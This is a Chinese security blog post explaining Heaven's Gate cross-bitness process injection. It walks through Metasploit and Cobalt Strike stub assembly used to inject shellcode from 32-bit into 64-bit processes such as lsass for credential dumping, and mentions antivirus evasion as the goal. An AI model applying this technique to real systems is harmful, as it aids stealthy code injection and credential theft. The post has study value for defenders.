@@ -1,0 +1,803 @@
+<!DOCTYPE html>
+<html lang="en" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="author" content="John Doe" />
+  <!-- Open Graph Description 简短摘要-->
+  
+  <!-- 用于搜索引擎的文章摘要 -->
+  
+  
+  
+  <title>
+    
+      跨位数注入 
+      
+      
+      |
+    
+     oneday
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.jpg">
+    <link rel="icon" href="/images/favicon.jpg">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+    
+<link rel="stylesheet" href="/css/figcaption/mac-block.css">
+
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/avatar.jpg" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">oneday</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          <a href="/categories/">Categories</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">Friends</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">跨位数注入</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+          2025-12-12 19:21:00
+        </span>
+        
+              <span class="post-categories">
+                <i class="iconfont icon-bookmark" title="Categories"></i>
+                
+                <span class="span--category">
+                  <a href="/categories/%E9%98%B2%E5%BE%A1%E8%A7%84%E9%81%BF/" title="防御规避">
+                    <b>#</b> 防御规避
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <p>跨位数注入的技术原理来源于heaven’s gate，这是一项非常古老的技术（至少出现十多年了），它允许64位操作系统上运行32位代码的进程直接切换至64位模式下执行代码，技术的关键就是通过 <code>retf</code> 或 <code>jmp fword ptr</code> 完成CPU短长模式的模式切换。</p>
+<p>其实这个主题（跨位数注入）我很早就想学习了，但当时技术水平不行，接着忙于工作学习的事就将它搁置，后面又忙于C2框架的开发而逐渐忘记，当我翻阅计划表时惊讶地发现这个idea躺在我的计划表里有一年了，刚好我将学习的方向转向二进制免杀，于是乎就有了这篇文章。</p>
+<p><strong>假设一个场景</strong>：当你用msf x86的shellcode完成上线，你想使用meterpreter的 <code>creds_all</code> 命令导出目标的所有凭据，这时你会尴尬的发现并没有任何凭据导出，这是因为内核把lsass.exe还有一些凭据的注册表当成<strong>64位进程</strong>保护，WOW64模式下的Mimikatz是无法dump出凭据的，当然还有其他场景需要在64位进程空间中进行，只是我水平有限说不出来……</p>
+<p>dump不出来，难道要就此止步吗？办法总比困难多，就有效的方式就是使用 <code>migrate &lt;PID&gt;</code> 命令迁移到x64程序，问题就迎刃而解。</p>
+<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/10/15/22-13-53-452d88a5b49ba136b01ea5f43b93de10-20251015221353-55d34b.png"></p>
+<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/10/15/22-13-41-4bb0bba7f7916b001ddcd2c908166a87-20251015221341-d17542.png"></p>
+<p>CS也有inject命令注入到x64的进程中</p>
+<p>图形界面</p>
+<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/10/15/22-18-36-452b9a40299d8a7fd34edeb0b66b8230-20251015221835-a95dff.png"></p>
+<p>命令形式</p>
+<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/10/15/22-20-11-f9d18c13779cb280ced6e10b1e32b090-20251015222011-77d083.png"></p>
+<p>上述的演示只停留在应用层的表面，而接下来我将探究其背后的技术原理和实现。</p>
+<h1 id="一、x32→x64"><a href="#一、x32→x64" class="headerlink" title="一、x32→x64"></a>一、<strong>x32→x64</strong></h1><p>正常来说32位只能注入到32位中，64位只能注入到64位中，即同位数注入。这是因为<strong>WOW64子系统</strong>的存在。WOW64子系统是Windows64位系统为兼容32位应用程序而设计的一个子系统。它允许32位进程在64位Windows系统上运行，使得旧版的32位应用程序可以在新的64位系统上继续使用</p>
+<p>但“兼容”只停留在用户态，一旦32位代码想使用 <code>CreateRemoteThread</code> 或 <code>RtlCreateUserThread</code> 或<code>NtCreateThreadEx</code>主动创建64位线程，就会立刻踩到红线： 64位线程入口地址高32位可能全为1，超出32位内存地址空间的限制（超过4GB）所以WOW64内核明确禁止<strong>32 → 64</strong> 的跨位宽线程创建。于是经典 <code>CreateRemoteThread</code> 注入思路在 WOW64 场景下直接失效。</p>
+<p>怎么实现跨位数注入呢？我们可以参照msf和cs的代码，总结出下面的几个步骤</p>
+<ol>
+<li>32位的inject程序使用 <code>VirtualAllocEx</code> 在64位远程进程分配内存（小于4GB的范围）；</li>
+<li>使用 <code>WriteProcessMemory</code> 将shellcode写入到刚刚分配的内存中；</li>
+<li>inject使用<code>VirtualAlloc</code>分配两段内存给两个stub使用，并将两个stub复制到这个到分配好的内存中；</li>
+<li>执行第一个stub，完成32-&gt;64的转换并将执行流转到第二个stub；</li>
+<li>第二个stub根据找到 <code>RtlCreateUserThread</code> 的地址，并调用 <code>RtlCreateUserThread</code> 在64位进程中创建一个线程，并设置为挂起状态，最后将线程句柄返回；</li>
+<li>第一个stub完成收尾：将CPU从64转换为32，并返回到inject中，执行后续代码；</li>
+<li>inject使用 <code>ResumeThread</code> 恢复线程，执行shellcode。为了观察shellcode是否被执行，我们可以使用弹窗shellcode或者弹计算器的shellcode。</li>
+</ol>
+<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images%2F2025%2F10%2F26%2F20-10-56-5d819a77856f91e92d0612ec515b7e5b-Drawing%202025-10-26%2019.33.57.excalidraw-5ee485.png" alt="Drawing 2025-10-26 19.33.57.excalidraw.png"></p>
+<p>代码的流程与远程线程注入大致相似，其核心的差异就是使用到了两个特别的stub shellcode，上文大致说了两个stub的作用，下面我们再介绍一些细节，进一步理解两个stub的作用：</p>
+<ol>
+<li><strong>第一个stub，migrate_executex64</strong>：由32位和64位机器码混合组成，主要负责<ul>
+<li>切换堆栈、保存非易失性寄存器和参数传递；</li>
+<li>CPU短模式切换成长模式，执行需要在x64模式下执行的机器码，这个x64机器码的作用是跳转到 <code>migrate_wownativex</code>；</li>
+<li>执行完 <code>migrate_wownativex</code> 后将CPU长模式切换成短模式；</li>
+<li>恢复堆栈和非易失性寄存器，最后返回到inject的代码中，执行inject的后续流程。</li>
+</ul>
+</li>
+<li><strong>第二个stub，migrate_wownativex</strong>：全部由64位机器码组成，主要负责<ul>
+<li>根据PEB→Ldr→ntdll.dll（64位的ntdll）→导出表找到 <code>RtlCreateUserThread</code> 的地址，这个操作非常的经典，我的Window Shellcode开发系列文章已经详细介绍过了。</li>
+<li>调用 <code>RtlCreateUserThread</code> 在目标进程中创建一个线程</li>
+<li>返回线程句柄，后续在inject要用到</li>
+<li>64位机器码要关注栈对齐，这个我不过多介绍了</li>
+</ul>
+</li>
+</ol>
+<p>两个stub shellcode是一大串的机器码，而且原shellcode并不免杀，这意味着我们需要将其转换成汇编代码，才能进行二次开发（本文没有涉及二开，各位师傅动手做一样吧不要想着我给出来了&gt;.&lt;）。</p>
+<p>除了编写上述提到的两个stub外，还需要注意在inject中使用VirtualAllocEx给需要在远程线程执行的payload（目标代码）分配内存时一定要<strong>小于4GB</strong>的范围。</p>
+<p>既然两个stub是跨位数注入的核心，而且还是汇编代码，想必对于部分师傅来说必起来有那么一点点困难，那么下文将详细的介绍如何两段构造stub shellcode代码以及部分设计思路和它们之间的关系，但由于本人水平实在有限，必定存在很多错误的地方，也请各位师傅们批判指正！</p>
+<p>两个stub的汇编代码和机器码的来源</p>
+<ol>
+<li><a target="_blank" rel="noopener" href="https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/migrate/executex64.asm">metasploit-framework&#x2F;external&#x2F;source&#x2F;shellcode&#x2F;windows&#x2F;x86&#x2F;src&#x2F;migrate&#x2F;executex64.asm at master · rapid7&#x2F;metasploit-framework</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x64/src/migrate/remotethread.asm">metasploit-framework&#x2F;external&#x2F;source&#x2F;shellcode&#x2F;windows&#x2F;x64&#x2F;src&#x2F;migrate&#x2F;remotethread.asm at master · rapid7&#x2F;metasploit-framework</a></li>
+</ol>
+<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images%2F2025%2F10%2F22%2F21-40-30-08dd94c1ef68cd24fe8eb011ef84bfbc-20251022214029781-069359.png"></p>
+<h2 id="1-1-migrate-executex64"><a href="#1-1-migrate-executex64" class="headerlink" title="1.1 migrate_executex64"></a>1.1 migrate_executex64</h2><p>CS的C代码中，将两个stub看作函数指针的形式，这样做的好处是在调用函数之前，调用方会按照 <code>WINAPI</code> 的调用规范传递参数。</p>
+<p>第一个stub作为 <code>EXECUTEX64</code> 函数，第二个stub作为 <code>X64FUNCTION</code>，它们的函数声明如下。不过X64FUNCTION函数并没有在代码中使用到，可能是为了直观的看出参数列表和传参方式吧。</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">typedef DWORD(WINAPI* EXECUTEX64)(X64FUNCTION pFunction, DWORD ctx);</span><br><span class="line">typedef BOOL(WINAPI* X64FUNCTION)(DWORD ctx);</span><br></pre></td></tr></table></figure>
+
+<p>在上面的函数声明中出现了ctx整数（其实我们看作是指针），其上下文结构体包含了4个字段总大小为32位，刚好是<code>DWORD</code>大小，其中前3个字段都是给 <code>RtlCreateUserThread</code> 使用，而hThread用于接收 <code>RtlCreateUserThread</code> 创建的线程句柄</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">typedef <span class="keyword">struct</span> _WOW64CONTEXT &#123;</span><br><span class="line">    union &#123; HANDLE hProcess; BYTE _[<span class="number">8</span>]; &#125; h;            <span class="comment">//句柄</span></span><br><span class="line">    union &#123; LPVOID lpStartAddress; BYTE _[<span class="number">8</span>]; &#125; s;      <span class="comment">//目标地址</span></span><br><span class="line">    union &#123; LPVOID lpParameter;   BYTE _[<span class="number">8</span>]; &#125; p;       <span class="comment">//参数</span></span><br><span class="line">    union &#123; HANDLE hThread;       BYTE _[<span class="number">8</span>]; &#125; t;       <span class="comment">//线程句柄</span></span><br><span class="line">&#125; WOW64CONTEXT, * LPWOW64CONTEXT;</span><br></pre></td></tr></table></figure>
+
+<p>先放完整的stub1的shellcode，我将根据代码的执行顺序以此讲解</p>
+<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images%2F2025%2F10%2F23%2F20-55-02-1bc565a88b521fecb76f743fbff742d3-20251023205502489-8f919c.png"></p>
+<h3 id="（一）切换堆栈、保存非易失性寄存器和参数传递"><a href="#（一）切换堆栈、保存非易失性寄存器和参数传递" class="headerlink" title="（一）切换堆栈、保存非易失性寄存器和参数传递"></a>（一）切换堆栈、保存非易失性寄存器和参数传递</h3><p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images%2F2025%2F10%2F23%2F20-48-26-6e716b33392d47d696f4229b956edb3f-20251023204825908-3049a9.png"></p>
+<p>①<strong>切换堆栈</strong>，这个不用我多说了把？大部分函数的开头都是这几个指令。</p>
+<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images%2F2025%2F10%2F23%2F20-45-29-c953009d9c211dca30311e05e36b7ff8-20251023204529360-fdcb5c.png"></p>
+<p>②<strong>保存非易失性寄存器</strong>，因为用到了esi、edi这两个非易失性寄存器，所以需要将这两个寄存器的值压栈保存</p>
+<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images%2F2025%2F10%2F23%2F20-46-17-07a5c8a9aa1fb747d05ae146d349b7c6-20251023204617759-2f92ea.png"></p>
+<p>③<strong>参数传递</strong></p>
+<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images%2F2025%2F10%2F23%2F20-49-28-61b0c301dc498b7c427d559dc4e55501-20251023204928618-7dfd06.png"></p>
+<p>执行到<code>mov     esi, [ebp+8]</code>此处时，栈的情况</p>
+<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images%2F2025%2F10%2F22%2F19-19-05-32e5d5acd1365c7fab79ba8f8cffa403-Drawing%202025-10-22%2012.49.31.excalidraw-769d9a.png" alt="Drawing 2025-10-22 12.49.31.excalidraw.png"></p>
+<ul>
+<li><code>mov     esi, [ebp+8]</code> ：获取第一个参数，即pFunction，第二个stub的地址</li>
+<li><code>mov     ecx, [ebp+0Ch]</code>：获取第二个参数，即ctx，在 <code>migrate_executex64</code> 中还用不到ctx，这是留给 <code>RtlCreateUserThread</code> 使用的。</li>
+<li><code>call    delta</code>：跳转到下一条指令，并在栈上留下下一条指令的地址，这是为了规避地址随机化的一种非常好用的手段</li>
+</ul>
+<h3 id="（二）CPU短模式切换成长模式，执行需要在x64模式下执行的机器码"><a href="#（二）CPU短模式切换成长模式，执行需要在x64模式下执行的机器码" class="headerlink" title="（二）CPU短模式切换成长模式，执行需要在x64模式下执行的机器码"></a>（二）CPU短模式切换成长模式，执行需要在x64模式下执行的机器码</h3><p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images%2F2025%2F10%2F23%2F20-57-55-48158c0daabf90ab459df2f983222407-20251023205755450-c22134.png"></p>
+<ul>
+<li><code>pop     eax</code>：弹出存放在栈上的地址，即本条指令 <code>pop     eax</code> 的地址；</li>
+<li><code>add     eax, 37</code>：<code>pop     eax</code> 加上37（0x25）即为 <code>native_x64</code> 标签所在指令的地址；</li>
+<li><code>sub     esp, 8</code>：分配8字节的栈空间，用于存放“远跳转结构”</li>
+<li><code>mov     edx, esp</code>：此时edx &#x3D; esp；</li>
+<li><code>mov [edx+4], 0x33</code>：段选择子（64 位用户代码段）。什么是段选择子解释起来非常困难，<strong>简单地说</strong>：CPU通过它瞬间切换 32&#x2F;64位模式，0x23表示32位模式，0x33表示64位模式。</li>
+<li><code>mov     [edx], eax</code>：将 <code>native_x64</code> 标签所在的指令地址作为偏移，与段选择子构成 <code>0x33:offset</code> 的远跳结构体。</li>
+<li><code>call    go_all_native</code>：跳转到go_all_native处的代码，并在栈上留下下一条指令的地址。这里的“下一条指令”指下图所示的第一条指令。</li>
+</ul>
+<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images%2F2025%2F10%2F23%2F21-00-51-d7ed088814babce57a9ffd1538df85ab-20251023210050931-26e78d.png"></p>
+<p>程序的执行流到了下图所示的代码</p>
+<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images%2F2025%2F10%2F23%2F21-16-22-867a0fcbec60e5a659298ee1693ae1fb-20251023211622281-a8a878.png"></p>
+<ul>
+<li><code>mov     edi, [esp]</code>：取WoW64返回地址返回地址，这个返回地址是从64位转回32位后，需要按32位执行的代码地址，即“恢复堆栈和非易失性寄存器……”的那段代码。</li>
+<li><code>jmp     fword ptr [edx]</code>：从所给的地址取6个字节的远跳结构体，切成64位模式，远跳转到x64代码段。我们在 <code>jmp     fword ptr [edx]</code> 处下一个断点，观察edx所指向的原跳结构体，如下图所示。</li>
+</ul>
+<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images%2F2025%2F10%2F23%2F21-14-11-4fa6b2eac8ef55a451d074993d85656f-20251023211411356-160c44.png"></p>
+<p>我们去看看偏移所指向的内容是什么，正是 <code>jmp     fword ptr [edx]</code> 的下一条指令。</p>
+<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images%2F2025%2F10%2F23%2F21-22-51-6e87320fb135c1c3cfef6cf21bdbbfd9-20251023212251039-b363e6.png"></p>
+<p>因为我是按32位来调试，当CPU从32-&gt;64时，调试器也就失效了。听了AI的解释说是跨位数注入可以用来反沙箱和反调试，这也是有道理的，没办法跟踪到切换成64位长模式的代码。</p>
+<p>由于技术水平有限，我没办法通过windbg断点在x64代码区域验证真的CPU切换到长模式，可以说这篇文章的汇编代码是目前为止我写过的最难调试的，涉及到<strong>CPU短长模式转换</strong>和<strong>跨进程调式</strong>。因为不能调式的原因，本文章大部分时间都是干巴巴的解释，没有调式验证，所以各位一定要保持半信半疑的态度！</p>
+<p>我没招了，再次看看msf的代码就行，这两个代码都是由<strong>Stephen Fewer</strong>编写，没错又是这位神一般的大佬。</p>
+<ol>
+<li><a target="_blank" rel="noopener" href="https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/migrate/executex64.asm">metasploit-framework&#x2F;external&#x2F;source&#x2F;shellcode&#x2F;windows&#x2F;x86&#x2F;src&#x2F;migrate&#x2F;executex64.asm at master · rapid7&#x2F;metasploit-framework</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x64/src/migrate/remotethread.asm">metasploit-framework&#x2F;external&#x2F;source&#x2F;shellcode&#x2F;windows&#x2F;x64&#x2F;src&#x2F;migrate&#x2F;remotethread.asm at master · rapid7&#x2F;metasploit-framework</a></li>
+</ol>
+<p><code>jmp     fword ptr [edx]</code> 就是跳到了下面的代码执行，正确的机器码和汇编指令对应关系应该为如下图所示的代码。</p>
+<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images%2F2025%2F10%2F23%2F21-31-19-1b8b8acfab727cb679cce6f3364f1892-20251023213118891-b4b2be.png"></p>
+<ul>
+<li><code>xor rax, rax</code>：有没有这条指令都无影响，即可以去掉。</li>
+<li><code>push rdi</code>：保存RDI 到栈上(包含WoW64返回地址)，因为接下来要跳转到stub2（看作X64FUNCTION函数）中执行代码了。</li>
+<li><code>call rsi</code>：跳转到stub2执行代码。</li>
+<li><code>pop rdi</code>：执行成功后，弹出栈上的WoW64返回地址</li>
+<li><code>push rax</code>：stub2的返回值，如果为1表示成功；0表示失败，返回值没什么用。其实这里的 <code>push rax</code> 指令等价于 <code>sub     esp, 8</code>，即分配8字节的栈空间，前者机器码占1一个字节，后者占3个字节。</li>
+<li><code>mov DWORD PTR [rsp+4], 0x23</code>：设置段选择子为0x23 (WoW64模式)</li>
+<li><code>mov DWORD PTR [rsp], edi</code>：设置偏移地址为WoW64返回地址。</li>
+<li><code>jmp dword PTR [rsp]</code>：CPU从64-&gt;32，并跳转到stub收尾的代码。</li>
+</ul>
+<h3 id="（三）恢复堆栈和非易失性寄存器，最后返回到inject的代码中，执行inject的后续流程"><a href="#（三）恢复堆栈和非易失性寄存器，最后返回到inject的代码中，执行inject的后续流程" class="headerlink" title="（三）恢复堆栈和非易失性寄存器，最后返回到inject的代码中，执行inject的后续流程"></a>（三）恢复堆栈和非易失性寄存器，最后返回到inject的代码中，执行inject的后续流程</h3><p>书接上文，其实就是跳转到了下图所示的代码</p>
+<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images%2F2025%2F10%2F23%2F21-47-49-85ce51c62488a7c5f07ed9152acf8975-20251023214749018-9567ba.png"></p>
+<p>执行 <code>add     esp, 20</code>前，此时栈布局如下：</p>
+<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images%2F2025%2F10%2F25%2F12-18-45-e38b2cc5c38daef02f7f1ed367182d2c-20251025121844985-78991e.png"></p>
+<p>所以为什么要清理这20个字节（8字节远跳转结构1 + 4字节wow64返回地址 + 8字节的远跳结构体2）的空间，这些空间是怎么产生的呢？看下图我框选的3条指令。</p>
+<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images%2F2025%2F10%2F23%2F21-57-31-71a608ace18478c503c77816eac08378-20251023215731205-2bab48.png"></p>
+<p>恢复完寄存器的值，执行 <code>ret 8</code> 即可返回到inject代码中执行后续逻辑，至此stub1的代码就是构造完了。</p>
+<p>在这里补充一点：不知道各位是否明白 <code>ret 8</code> 的作用？在函数声明的时候我们不是用<code>WINAPI</code>来定义函数的调用约定。</p>
+<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images%2F2025%2F10%2F25%2F12-32-23-4edf39bc391610683deff3a522ff41fb-20251025123223412-500896.png"></p>
+<p>而 <code>WINAPI</code> 就是 <code>__stdcall</code>。<code>__stdcall</code> 要求被调用方法清理堆栈（包括存放在栈上的参数）</p>
+<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images%2F2025%2F10%2F25%2F13-05-23-516bc643504bccb48c28d126e9856d3a-20251025130523218-c74b0e.png"></p>
+<p>所以需要使用 <code>ret 8</code>，返回并清理8个字节的参数（4字节pFunction函数指针 + 4字节ctx指针）</p>
+<h3 id="（四）stub1在AMD-CPU和Intel-CPU上的细微差异"><a href="#（四）stub1在AMD-CPU和Intel-CPU上的细微差异" class="headerlink" title="（四）stub1在AMD CPU和Intel CPU上的细微差异"></a>（四）stub1在AMD CPU和Intel CPU上的细微差异</h3><p>作为一个同时拥有AMD CPU和intel CPU的双持玩家，补充一下AMD CPU 在跨位数注入时的问题。我注意到<strong>Stephen Fewer</strong>给出代码中与CS多出了两个指令。起初我并不在意，连CS都没有在源码（4.5）中实现这两个指令，这意味两段stub在AMD和intel应该一致的。打脸来得太突然，我在AMD CPU上进行测试，居然报错了，涉及到<strong>CPU短长模式转换</strong>和<strong>跨进程调式</strong>，调试起来无比困难，只能进行浅浅地排查，最终我回想起MSF中在代码中给出的两条奇怪的指令</p>
+<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images%2F2025%2F10%2F23%2F22-01-15-a4b4721bfe8c2e35eb221c9c73383683-20251023220114907-931037.png"></p>
+<p>可以看到注释说这个bug是由 <a target="_blank" rel="noopener" href="https://github.com/rwfpl/rewolf-wow64ext">rewolf-wow64ext</a> 项目的作者修复，我们跟着网址去看看 <a target="_blank" rel="noopener" href="http://blog.rewolf.pl/blog/?p=1484">wow64ext v1.0.0.8 – ReWolf 的博客</a>是怎么发现并修复bug。</p>
+<p>rewolf怀疑是 <code>RETF</code> 指令之后出现了<strong>竞态条件</strong>（race condition），导致某些内存页突然“失效”。这两条指令的作用是<strong>重新加载段寄存器SS</strong>，并<strong>屏蔽中断</strong>。根据Intel手册，<code>mov ss, ax</code> 会阻止中断直到下一条指令执行完毕，从而<strong>稳定CPU状态</strong>。rewolf也不完全确定为什么这样能修复问题，但实测有效。</p>
+<p><strong>解释看完了，在实际代码编写中又遇到了<br>几个问题，具体来说我们需要在stub1中修改三处地方</strong>：</p>
+<p><strong>第一处</strong>：补充这两个指令</p>
+<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images%2F2025%2F10%2F23%2F22-12-08-ff07fd1f7590cacbb2454cef6378df17-20251023221208651-424690.png"></p>
+<p>因为补充了这两个指令，所以需要修改两处偏移。</p>
+<p><strong>第二处</strong>：偏移从0x25-&gt;0x2b<br><strong>第三处</strong>：偏移从0x9-&gt;0x0f</p>
+<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images%2F2025%2F10%2F23%2F22-12-46-3714ffce0d2609b816d74ec6716b19c7-20251023221246025-3169e3.png"></p>
+<p>增加这两条指令后，AMD CPU和intel CPU都能够正常执行。</p>
+<p>在这里不得不感概Stephen Fewer和Rewolf登峰造极的技术，或许我追求一辈子也很难达到这种高度。</p>
+<h2 id="1-2-migrate-wownativex"><a href="#1-2-migrate-wownativex" class="headerlink" title="1.2 migrate_wownativex"></a>1.2 migrate_wownativex</h2><p>由于stub2 shellcode 比stub1大了很多，其中很大一部份代码是获取目标函数地址，我称之为 <code>GetProcAddressByHash</code>。</p>
+<p>由于CS的stub2逆向成汇编指令实在太多，我就截屏msf的实现，挑重点讲， 至于 <code>GetProcAddressByHash</code> 的代码解释就略过了。</p>
+<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images%2F2025%2F10%2F25%2F13-54-29-48e59a3aecdc0e7eacc65c37aa3b03e2-20251025135427788-73e243.png"></p>
+<h3 id="（一）初始化与栈对齐"><a href="#（一）初始化与栈对齐" class="headerlink" title="（一）初始化与栈对齐"></a>（一）初始化与栈对齐</h3><p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images%2F2025%2F10%2F25%2F13-28-24-684a990eb3a93b211e9a5f0cc4d1aaa0-20251025132824065-b0c95f.png"></p>
+<p>这开头的几条指令可是大有说法的，且听我慢慢道来。</p>
+<ul>
+<li><code>cld</code>：清除方向标志位，DF &#x3D; 0，字符串操作从低地址向高地址进行，即每次操作后 SI&#x2F;DI 寄存器递增。常见于<code>movsb</code> 和 <code>lodsb</code>。当然你不加这条指令也能够正常运行，因为大多数情况下DF&#x3D;0，但我建议还是加上好。</li>
+<li><code>mov     rsi, rcx</code>：rcx（ecx）在stub1中一直没被破坏，还是存放着ctx指针，然而在64位rcx要作为参数寄存器频繁使用，所以将ctx指针存放到rsi中。</li>
+<li><code>mov     rdi, rsp</code>：保存原始rsp的值。</li>
+<li><code>and     rsp, 0xfffffffffffffff0</code>：栈按16字节对齐。</li>
+<li><code>call start</code>：跳转到start标签处的代码，并在栈上留下 <code>GetProcAddressByHash</code> 地址以备后续使用。</li>
+</ul>
+<p><code>mov     rdi, rsp</code> 和 <code>and     rsp, 0xfffffffffffffff0</code> 必须好好讲解一下，这是对我以往松散知识的<strong>一次总结</strong>：</p>
+<p>我们都知道，esp按4字节增减，那么esp末尾最后一位可能为0，可能为4，可能为8，可能为0xc。</p>
+<p>如果是64位的程序，执行到 <code>and     rsp, 0xfffffffffffffff0</code> 之前，rsp很大概率为8结尾，这是我观察得到的，也是微软 x64 调用约定（Windows x64 ABI）保证“call 之前RSP必须16字节对齐”。</p>
+<p>当Cpu从32-&gt;64位，则esp &#x3D; rsp，rsp也可能有4种情形，为了符合x64调用约定（在这里体现为调用<code>call GetProcessAddrByHash</code>）时rsp一定要以0结尾，所以要使用<code>and     rsp, 0xfffffffffffffff0</code>使rsp以16字节对齐。</p>
+<p>但这时又出现了一个问题，此时rsp指向返回地址，使用 <code>and rsp, 0xfffffffffffffff0</code> 指令之后，会丢失返回地址，导致无法返回，为了解决这个问题，就需要用到一个非易失性寄存器去保存原始rsp，该寄存器在保存原始rsp的值之后就不在后续过程中使用，如需要使用必须保存到栈上之后再恢复，这就是为什么要 <code>mov     rdi, rsp</code> 保存原始rsp的原因。</p>
+<h3 id="（二）根据HASH动态获取目标函数地址"><a href="#（二）根据HASH动态获取目标函数地址" class="headerlink" title="（二）根据HASH动态获取目标函数地址"></a>（二）根据HASH动态获取目标函数地址</h3><p>GetProcessAddrByHash这个函数我不想多说了，在我前几篇文章就详细介绍过了，特别是在这篇文章 <a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/17961">Windows Shellcode开发（x64 stager）-先知社区</a>中明确介绍过了，可能存在细微的差异，但思路和最终达成的目的都是一样的，即给定函数名hash，根据PEB→Ldr→InMemoryOrderModuleList-&gt;ntdll.dll→导出表找到目标函数地址 ，并调用。</p>
+<p>⚠<strong>注意</strong>：本文中的 <code>GetProcessAddrByHash</code> 是根据CS shellcode逆向得来，我在代码中给的注释是AI给，不保证正确性。</p>
